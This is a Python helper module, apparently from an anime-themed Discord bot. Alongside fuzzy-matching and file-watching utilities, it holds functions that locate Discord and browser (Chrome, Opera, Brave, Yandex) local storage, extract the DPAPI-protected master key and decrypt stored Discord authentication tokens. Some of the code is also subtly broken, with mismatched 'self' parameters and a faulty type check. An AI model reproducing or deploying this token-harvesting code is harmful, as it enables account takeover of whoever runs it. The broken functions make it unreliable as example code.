import base64
import json
import os
import re

import Levenshtein
from Crypto.Cipher import AES
if os.name == "nt":
    from win32crypt import CryptUnprotectData


def isSomething(inp, list_of_interested, accuracy):
    if list_of_interested is list:
        for seggs in list_of_interested:
            if Levenshtein.ratio(inp, seggs) >= accuracy:
                return True
            else:
                pass
        return False
    else:
        if Levenshtein.ratio(inp, list_of_interested) >= accuracy:
            return True
        else:
            return False
    # print(f"{inp} == {list_of_interested} ? Accuracy: {ratio}")


def find_tokens(path, debug):
    pathh = path
    path += "\\Local Storage\\leveldb"
    regexp_new = r"dQw4w9WgXcQ:[^\"]*"
    regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    roaming = os.getenv("appdata")

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue

        for line in [
            x.strip()
            for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
            if x.strip()
        ]:
            for token in re.findall(regexp_new, line):
                tokens.append(
                    decrypt_val(
                        base64.b64decode(token.split("dQw4w9WgXcQ:")[1]),
                        get_master_key(roaming + f"\\{pathh}\\Local State"),
                    )
                )
    return tokens


def get_tokens(debug):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    tokenz = []

    paths = {
        "Discord": roaming + "\\Discord",
        "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb",
        "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable",
        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default",
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            if debug:
                print(f"Path not found: {path}")
            continue
        if debug:
            print(f"Path found: {path}")

        tokens = find_tokens(path, debug)

        if len(tokens) > 0:
            for token in tokens:
                tokenz.append(f"{platform}: {token}")
    return tokenz


def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass


def get_master_key(self, path: str) -> str:
    if not os.path.exists(path):
        return

    if "os_crypt" not in open(path, "r", encoding="utf-8").read():
        return

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key


# https://stackoverflow.com/questions/182197/how-do-i-watch-a-file-for-changes
class FileWatch:
    def __init__(self, filepath):
        self.filename = filepath
        self._cached_stamp = os.path.getmtime(filepath)

    def watch(self):
        stamp = os.stat(self.filename).st_mtime
        if stamp != self._cached_stamp:
            self._cached_stamp = stamp
            return True


if __name__ == "__main__":
    keypath = os.path.normpath(
        os.path.join(os.path.dirname(__file__), os.pardir, "keywords")
    )
    with open(f"{keypath}/animes.txt", "r") as f:
        animes = f.read().splitlines()
    with open(f"{keypath}/characters.txt", "r") as f:
        characters = f.read().splitlines()
    ok = "Kaori Sensei"
    character = ""
    for i in characters:
        ratio = Levenshtein.ratio(ok, i)
        print(f"Accuracy: {ratio} - {i}")
    # print(f"Accuracy: {Levenshtein.ratio(ok, character)} - {character}")
